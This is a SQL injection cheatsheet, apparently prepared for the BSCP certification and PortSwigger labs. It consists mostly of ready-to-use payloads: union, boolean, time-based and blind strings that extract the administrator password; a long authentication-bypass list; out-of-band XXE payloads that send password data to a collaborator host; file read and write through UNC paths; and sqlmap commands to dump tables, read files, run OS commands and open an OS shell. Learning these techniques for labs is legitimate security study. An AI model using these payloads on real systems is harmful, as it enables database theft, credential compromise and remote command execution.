# SQL INJECTION CHEATSHEET + MOST IMPORTANT LABS

## Index

- [SQL INJECTION CHEATSHEET + LABS](#sql-injection-cheatsheet--labs)
  - [Key Terms](#key-terms)
  - [Walkthrough - Most Important Labs](#walkthrough---most-important-labs)
  - [CHEATSHEET](#cheatsheet)
      - [DATABASE-TYPE-VERSION](#database-type-version)
      - [DATABASE CONTENT](#database-content)
      - [UNION BASED](#union-based)
      - [BOOLEAN BASED](#boolean-based)
      - [TIME BASED](#time-based)
      - [BLIND BASED](#blind-based)
      - [OUT-OF-BAND](#out-of-band)
      - [CONCAT AND SUBSTRING](#concat-and-substring)
      - [BYPASSING-SQL-SINTAX](#bypassing-sql-sintax)
      - [WAF-AUTH-BYPASS](#waf-auth-bypass)
      - [SQL MAP](#sql-map)

---

## Key Terms

 ```bash

    - ERROR BASED -> Uses database errors to infer data

    - BOOLEAN BASED -> Infers data via true/false responses

    - TIME BASED -> Infers data by measuring query execution delay

    - OUT-OF-BAND BASED -> Exfiltrates data via DNS, HTTP, or file requests

    - SQL MAP -> Automates SQLi testing and exploitation

    - DUAL -> Oracle single-row table for SELECT without real tables
```

---

## Walkthrough - Most Important Labs

- [SQLI with filter WAF bypass via XML encoding using hackvertor extension](sql-waf-bypass-hackvertor.md)
- [Blind time condicional sqli](blind-time-conditional-sqli.md) ❗
- [3]()

---

## CHEATSHEET

> ❗SQL Injection has an endless variety of payloads, bypasses, and techniques. This is my cheatsheet applied to the   BSCP, but in this case I recommend checking out the payloads from [payloads-all-the-things-sqli](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection) and [portswigger-sqli](https://portswigger.net/web-security/sql-injection/cheat-sheet)

<br>

#### DATABASE-TYPE-VERSION

``` sql
SELECT version()  --> PostgreSQL 
SELECT @@version  --> Microsoft, MySQL
SELECT * FROM v$version  --> Oracle  
SELECT BANNER FROM v$version --> Oracle
```

#### DATABASE CONTENT

```sql
--- ORACLE (no information schema)
SELECT table_name FROM all_tables
SELECT table_name FROM all_tab_columns WHERE table_name = '<table-name>'
SELECT <colum1> || ':' || <column2> from <table_name>

--- PostgreSQL
SELECT * FROM information_schema.tables
SELECT * FROM information_schema.columns WHERE table_name = '<table-name>'

--- MySQL
SELECT * FROM information_schema.tables
SELECT * FROM information_schema.columns WHERE table_name = '<table-name>'

--- Microsoft
SELECT * FROM information_schema.tables
SELECT * FROM information_schema.columns WHERE table_name = '<table-name>'


SELECT schema_name from information_schema.schemata
SELECT table_name from information_schema.tables where table_schema='foo' --
SELECT column_name from information_schema.columns where table_schema='foo' and table_name='bar' -- 
SELECT 1,group_concat(User,0x3a,Password),3 from mysql.user --

```

#### UNION BASED

```sql
' UNION SELECT NULL,NULL,NULL --  null is used because it must return the same data type
' UNION SELECT 1,2,3 --
' UNION SELECT 'foo',null,null -- check in which column we can inject a string
' UNION SELECT 'foo' || ':' || 'bar',null -- display multiple values in the same column
' UNION SELECT 'foo' ||  '0x3a' || 'bar',null  
' UNION SELECT group_concat(foo,bar),null --
```

#### BOOLEAN BASED

```sql
http://example.com/item?id=1 AND 1=1 -- except normal req
http://example.com/item?id=1 AND 1=2 -- except error 
http://example.com/item?id=1 AND LENGTH(@@hostname)=1 -- expect no error
http://example.com/item?id=1 AND LENGTH(@@hostname)=N -- expect error
```

#### TIME BASED

```sql
pg_sleep(10) --> PostgreSQL
dbms_pipe.receive_message(('a'),10) --> Oracle
DBMS_LOCK.SLEEP(10 --> Oracle
WAITFOR DELAY '0:0:10' --> Microsoft
SLEEP(10)  --> MySQL

```

#### BLIND BASED

```sql
-- oracle --
foo'||(select '' from dual)||'  -- no error
foo'||(select '' from noexisto)||'  -- error
foo'||(select '' from users where rownum= 1)||' -- no error? table user exists

(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual) --  true -> error
(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual) -- false -> no error
(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END from users where username='administrator') -- true/false -> /error/noerror 
(SELECT CASE WHEN LENGTH(password)>10 THEN TO_CHAR(1/0) ELSE '' END from users where username='administrator')
(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END from users where username='administrator')

AND 1=CAST((SELECT username FROM users ROWNUM 1) AS int)--

-- EXAMPLE -> TrackingId=test%3b select case when(username='administrator'and length(password)=20)

SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END--
SELECT CASE WHEN (username='administrator') THEN pg_sleep(10) ELSE pg_sleep(0) END from users--
SELECT CASE WHEN (username='administrator' AND LENGTH(password)>20) THEN pg_sleep(10) ELSE pg_sleep(0) END from users--
SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,1,1)='a') THEN pg_sleep(10) ELSE pg_sleep(0) END from users--

```

#### OUT-OF-BAND

```sql
-- SQLI + XXE -> CHECK DNS CALLBACK
SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://<COLLAB_DOMAIN>/"> %remote;]><root>&remote;</root>'),'/l') FROM dual;

-- SQLI + XXE OOB -> EXTRACT DATA --
SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(<OOB_URL_CONCAT_EXPRESSION>)||'.<COLLAB_DOMAIN>/"> %remote;]><root>&remote;</root>'),'/l') FROM dual;

-- EXAMPLES

TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--

Cookie: TrackingId='union SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||'FOO.'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.<BURP-COLAB>/">+%25remote%3b]><root>%26remote%3b</root>'),'/l')+FROM+dual--%3b'; session=uusQnFTiIjfdetXz7v1zm2KKNYqU46MI'

Cookie: TrackingId=a3j0nwT10l24RK9b'union+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(select password from users where username='administrator')||'.mlbzjigg5je1ct8leohiiwd5cwin6du2.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual -- -'


-- OOB -> READ FILES 
SELECT LOAD_FILE('\\\\<COLLAB_DOMAIN>\\<FILENAME>');

-- OOB -> WRITE FILES 
SELECT username, password INTO OUTFILE '\\\\<COLLAB_DOMAIN>\\<FILENAME>';
```

#### CONCAT-AND-SUBSTRING

```sql
'foo' || 'bar'          -> Oracle  
'foo' + 'bar'           -> Microsoft SQL Server  
'foo' || 'bar'          -> PostgreSQL  
'foo' 'bar'             -> MySQL (espacio)  
CONCAT('foo','bar')     -> MySQL  

SUBSTR('foobar', 4, 2)      -> Oracle  
SUBSTRING('foobar', 4, 2)   -> Microsoft SQL Server  
SUBSTRING('foobar', 4, 2)   -> PostgreSQL  
SUBSTRING('foobar', 4, 2)   -> MySQL

```

#### BYPASSING-SQL-SINTAX

```sql
-- BYPASSIN  EQUALS --

-- MySQL/SQL Server e.g -> SUBSTRING(username,1,1)='a' 
SUBSTRING(username,1,1)LIKE 'a' --> burp intruder
SUBSTRING(username,1,1)IN 'a' 'b' 'c' ...
SUBSTRING(VERSION(),1,1) BETWEEN 1 AND 3 -- 2
-- ORACLE e.g -> SUBSTR(username, 1, 1) = 'a'
SUBSTR(username, 1, 1) LIKE 'a' --> burp intruder
SUBSTR(username, 1, 1) IN ('a', 'b', 'c', ...)
SUBSTR(VERSION(), 1, 1) BETWEEN '1' AND '3' -- 2 

-- BYPASS KEYWORDS
AND   --> and , aNd , && 
OR    --> || 
=     --> LIKE , REGEXP , BETWEEN
>     --> NOT BETWEEN O AND X
WHERE --> HAVING

```

#### WAF-AUTH-BYPASS

```
administrator' --
administrator' #
administrator'/*
administrator' or '1'='1
administrator' or '1'='1'--
administrator' or '1'='1'#
administrator' or '1'='1'/*
administrator'or 1=1 or ''='
administrator' or 1=1
administrator' or 1=1--
administrator' or 1=1#
administrator' or 1=1/*
administrator') or ('1'='1
administrator') or ('1'='1'--
administrator') or ('1'='1'#
administrator') or ('1'='1'/*
administrator') or '1'='1
administrator') or '1'='1'--
administrator') or '1'='1'#
administrator') or '1'='1'/*
1234 ' AND 1=0 UNION ALL SELECT 'administrator', '81dc9bdb52d04dc20036dbd8313ed055
administrator" --
administrator" #
administrator"/*
administrator" or "1"="1
administrator" or "1"="1"--
administrator" or "1"="1"#
administrator" or "1"="1"/*
administrator"or 1=1 or ""="
administrator" or 1=1
administrator" or 1=1--
administrator" or 1=1#
administrator" or 1=1/*
administrator") or ("1"="1
administrator") or ("1"="1"--
administrator") or ("1"="1"#
administrator") or ("1"="1"/*
administrator") or "1"="1
administrator") or "1"="1"--
administrator") or "1"="1"#
administrator") or "1"="1"/*
1' or 1.e(1) or '1'='1
1234 " AND 1=0 UNION ALL SELECT "administrator", "81dc9bdb52d04dc20036dbd8313ed055
'-'
' '
'&'
'^'
'*'
' or ''-'
' or '' '
' or ''&'
' or ''^'
' or ''*'
"-"
" "
"&"
"^"
"*"
" or ""-"
" or "" "
" or ""&"
" or ""^"
" or ""*"
or true--
" or true--
' or true--
") or true--
') or true--
' or 'x'='x
') or ('x')=('x
')) or (('x'))=(('x
" or "x"="x
") or ("x")=("x
")) or (("x"))=(("x
or 1=1
or 1=1--
or 1=1#
or 1=1/*
```

#### SQL MAP
```bash
## MOST IMPORTANT PARAMS

--url="<URL>"
-p="PARAM-VULN"
--cookie=
--level=5
--risk=3
--prefix=)"
--dbms=<DBMS>
--param-exclude='param1|param2|..'
--batch
--dump
--threads
--technique=(default BEUSTQ)
--os
-D <DB>
-T <TABLE>
-C <COLUMN>
--sql-query="<QUERY>"
--purge
--tor
--os-cmd
--file-read
```

---
```bash
## BASIC EXAMPLES

# From URL
sqlmap --url=<URL> --cookie=<COOKIE> -p <PARAM> \
  --level=5 --risk=3 --batch --threads=10 \
  --dbms=<DBMS> \
  --sql-query="SELECT password FROM <TABLE> WHERE username=<USER>"

# From Burp request
sqlmap -r <REQUEST.txt> --level=5 --risk=3

# Dump specific table
sqlmap -r req.txt --level=5 --risk=3 --dump -D public -T users 

# OS Shell
sqlmap -u "http://<IP>?search=test" \
  -p search \
  --cookie="<LOGGED-COOKIE>" \
  --level=3 --risk=2 \
  --random-agent \
  --dbms=<DBMS> \
  --os-shell
```

---
```bash
## ENUMERATE & DUMP

# 1. List databases
sqlmap -u "https://target.com/page" \
  --cookie="TrackingId=xyz*; session=abc" \
  -p TrackingId \
  --dbms=PostgreSQL \
  --batch --threads=10 \
  --dbs

# 2. List tables  →  add to previous command
--tables -D <DB>

# 3. Dump table  →  add to previous command
--dump -T <TABLE> -D <DB> -C password
```

---
```bash
## CUSTOM SQL QUERY

sqlmap -u "https://target.com/filter?category=Pets" \
  -p category \
  --dbms=PostgreSQL \
  --level=5 --risk=3 \
  --batch --threads=10 \
  --sql-query="SELECT password FROM users WHERE username='administrator'"
```

---
```bash
## READ FILES / OS COMMANDS

sqlmap -u "<IP>/?category=Pets" -p category --file-read "/home/carlos/secret" -v 1
sqlmap -u "<IP>/?category=Pets" -p category --os-cmd "cat /home/carlos/secret" -v 1
```


